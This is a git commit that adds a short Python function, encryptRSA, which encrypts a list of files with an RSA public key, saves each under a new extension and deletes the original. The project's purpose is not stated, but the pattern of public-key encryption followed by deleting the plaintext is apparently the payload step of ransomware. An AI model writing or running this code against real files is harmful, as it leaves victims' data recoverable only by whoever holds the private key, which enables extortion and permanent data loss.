9c2972a2f197611611b8b8cf869c44968d043df0
Zekeriya AY <zekeriya@zekeriyaay.com>
2023-05-10 23:51:56 +0300

    RSA encrypt addded

---
+++ rsa_algorithm/encrypt.py
@@ -0,0 +1,19 @@
+import os
+import fast_file_encryption as ffe
+from settings import ENC_EXT, KEYS_DIR, RSA_PUBLIC_KEY
+from pathlib import Path
+
+
+def encryptRSA(files):
+    print(f'\n[+] Encrypting {len(files)} files')
+
+    public_key_path = f'{KEYS_DIR}/{RSA_PUBLIC_KEY}'
+    public_key = ffe.read_public_key(public_key=Path(public_key_path))
+    encryptor = ffe.Encryptor(public_key)
+
+    for file in files:
+        encrypt_file = file + ENC_EXT
+        encryptor.copy_encrypted(Path(file), Path(encrypt_file))
+
+        os.remove(file)
+        print(f'[+] {file} -> {file + ENC_EXT}')
